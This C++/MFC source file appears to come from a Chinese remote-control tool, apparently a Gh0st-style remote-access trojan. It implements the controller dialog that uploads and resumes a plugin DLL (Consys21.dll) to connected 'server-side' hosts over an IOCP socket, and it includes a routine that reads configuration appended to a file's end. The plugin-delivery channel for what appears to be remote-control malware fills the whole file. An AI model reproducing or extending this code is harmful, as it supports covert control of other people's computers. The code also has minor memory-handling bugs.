// DllDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "DllDlg.h"
#include "MainFrm.h"
#include "PcView.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

HINSTANCE hdll;
HANDLE hDllFile;
void*  MemDll;
int    SizeDll;
DWORD  BytesRead;

__int64	Bf_nCounter = 0;// 备份计数器  由于比较用
LONG	Bf_dwOffsetHigh = 0;
LONG	Bf_dwOffsetLow = 0;
/////////////////////////////////////////////////////////////////////////////

CString strFilePath = "Consys21.dll";  //功能插件文件名称

enum
{
	COMMAND_FILE_DLLSIZE = 1,		// DLL上传时的文件大小
	COMMAND_FILE_DLLDATA,			// DLL上传时的文件数据
	COMMAND_FILE_DLLTODOWNLOAD,     // 重新下载DLL数据
	TOKEN_DLLDATA_CONTINUE,			// DLL继续传输数据
	TOKEN_DLLDATA_SIZE              // 返回DLL控件文件大小
};


CDllDlg::CDllDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CDllDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CDllDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	ModifyStyleEx( WS_EX_APPWINDOW, 0 ); 

	char strSelf[MAX_PATH];
	//获取程序自身完整路径名称
	GetModuleFileName(NULL, strSelf, sizeof(strSelf));  
	m_strOperatingPath = strSelf;
	
	//连接插件途径
	m_strOperatingPath.Format("%s\\Control\\", m_strOperatingPath.Mid(0,m_strOperatingPath.ReverseFind('\\')));
	m_strOperatingFile = m_strOperatingPath + strFilePath;
}


void CDllDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDllDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX, IDC_DLLDLG_PROGRESS, m_dlldlg_progress);
	//}}AFX_DATA_MAP
}
void CDllDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_DLLDATA_CONTINUE:   //发送文件数据
		SendFileData();
		break;
	case TOKEN_DLLDATA_SIZE:       //重新发送文件数据
		{
			FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
			m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
			DWORD DLLType = (m_pContext->m_DeCompressionBuffer.GetBuffer(1)[8]);
			ShowProgress();  //进度显示
			
			CString strdigs;
			strdigs.Format("服务端已经存在功能插件，数据为 %dKB，\n请选择操作类型... ",(int)(m_nCounter / 1024));
			SetDlgItemText(IDC_DLLINUSE_NEWS,strdigs);   //
			
			GetDlgItem(IDC_DLLDATA_CONT)->EnableWindow(TRUE);
			GetDlgItem(IDC_DLLDATA_AGAIN)->EnableWindow(TRUE);
			
			if(DLLType == COMMAND_DLL_CONTINUE)     //控件续传
			{
				if(m_nOperatingFileLength == m_nCounter)  //文件大小相等 退出
					OnDllClose();
				else
					OnDllDataAgain();  //重新上传
			}
			else if(DLLType == COMMAND_DLL_UPGRADE)  //控件升级
			{
				OnDllDataAgain();
			}
		break;
		}
	default:
		// 传输发生异常数据
		break;
	}
}

BEGIN_MESSAGE_MAP(CDllDlg, CDialog)
	//{{AFX_MSG_MAP(CDllDlg)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_DLLCLOSE, OnDllClose)
	ON_BN_CLICKED(IDC_DLLDATA_AGAIN,OnDllDataAgain)
	ON_BN_CLICKED(IDC_DLLDATA_CONT,OnDllDataCont)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDllDlg message handlers
BOOL CDllDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

// 	HICON m_hIcon	= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICOS1));
// 	SetIcon(m_hIcon, TRUE);			// Set big icon
// 	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	m_dlldlg_progress.SetRange(0, 100);
	m_dlldlg_progress.SetPos(0);
	m_bIsStop=false;

	SendUploadJob(strFilePath);  //上传插件  发送文件长度

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CDllDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default

	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}

int my_memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

#define	MAX_CONFIG_LEN	1024
LPCTSTR FindConfigString(char *strFileName, LPCTSTR lpString)
{
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;
	
	HANDLE	hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	
	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);
	
	int offset = my_memfind(lpConfigString, lpString, MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
		return lpConfigString + offset;
	}
}

void CDllDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
}

void CDllDlg::SendFileData()
{

	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(dwOffsetLow, dwOffsetHigh);
	if(m_nCounter<0)   //数据出错 返回上传传送数据
	{
		m_nCounter = Bf_nCounter;
		dwOffsetHigh = Bf_dwOffsetHigh;
		dwOffsetLow = Bf_dwOffsetLow;
	}
	else
	{
		Bf_nCounter = m_nCounter;
		Bf_dwOffsetHigh = dwOffsetHigh;
		Bf_dwOffsetLow = dwOffsetLow;
	}

	ShowProgress(); //进度显示

	if (m_nCounter == m_nOperatingFileLength || dwOffsetLow == -1 || m_bIsStop)
	{
		EndLocalUploadFile();  //文件下载完成 关闭窗口
		return;
 	}

	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	
	DWORD	nNumberOfBytesToRead = MAX_RSEND_DATA - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_RSEND_DATA);
	// Token,  大小，偏移，数据
	lpBuffer[0] = COMMAND_FILE_DLLDATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
	// 返回值
	bool	bRet = true;
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);
	
	
	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize, NULL);
	}
	LocalFree(lpBuffer);
}

void CDllDlg::ShowProgress()
{
	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}
	
	int	progress = (int)((float)(m_nCounter * 100) / m_nOperatingFileLength);
	m_dlldlg_progress.SetPos(progress);

	CString strdig;
	strdig.Format("%d%%",progress);
	SetDlgItemText(IDC_DLLDLG_PROGREBT,strdig);   //

	strdig.Format("%dKB",(int)(m_nCounter / 1024));
	SetDlgItemText(IDC_DLLDLG_REMOTE,strdig);   //
}

//文件下载完成 关闭窗口
void CDllDlg::EndLocalUploadFile()
{
	Sleep(500);
	::SendMessage(m_hWnd,WM_CLOSE,0,0);

	return;
}

//发送文件大小
BOOL CDllDlg::SendUploadJob(CString m_FilePats)
{
	
	DWORD	dwSizeHigh = NULL;
	DWORD	dwSizeLow = NULL;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;

	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		char Path[MAX_PATH];
	    sprintf(Path, "本地控件 %s 未找到，无法上传插件!! ", m_FilePats);
	    MessageBox(Path,"提示！！", MB_OK | MB_ICONWARNING);
		::SendMessage(m_hWnd,WM_CLOSE,0,0);
		return FALSE;
	}

	unsigned long stspp = MAXDWORD;
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (stspp+1)) + dwSizeLow;
	CloseHandle(hFile);

	CString strdig;
	strdig.Format("%dKB",(int)(m_nOperatingFileLength / 1024));
	SetDlgItemText(IDC_DLLDLG_LOCAL,strdig);   //

	// 构造数据包，发送文件长度
	int		nPacketSize = 9;//fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = COMMAND_FILE_DLLSIZE;   
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize, NULL);
	
	LocalFree(bPacket);
	return TRUE;
}

void CDllDlg::OnDllClose() 
{
	// TODO: Add your control notification handler code here
	OnClose();
	OnOK();
}

//数据重新上传
void CDllDlg::OnDllDataAgain()  
{
    CString strdigs = "服务端功能插件，重新上传中... ";
	SetDlgItemText(IDC_DLLINUSE_NEWS,strdigs);   //
	GetDlgItem(IDC_DLLDATA_CONT)->EnableWindow(NULL);
	GetDlgItem(IDC_DLLDATA_AGAIN)->EnableWindow(NULL);

	BYTE lpBuffer = COMMAND_FILE_DLLTODOWNLOAD;
	m_iocpServer->Send(m_pContext, &lpBuffer, 1, NULL);
}

//数据继续上传
void CDllDlg::OnDllDataCont()
{
    CString strdigs = "服务端功能插件，继续上传中... ";
    SetDlgItemText(IDC_DLLINUSE_NEWS,strdigs);   //
	GetDlgItem(IDC_DLLDATA_CONT)->EnableWindow(NULL);
	GetDlgItem(IDC_DLLDATA_AGAIN)->EnableWindow(NULL);

	SendFileData();
}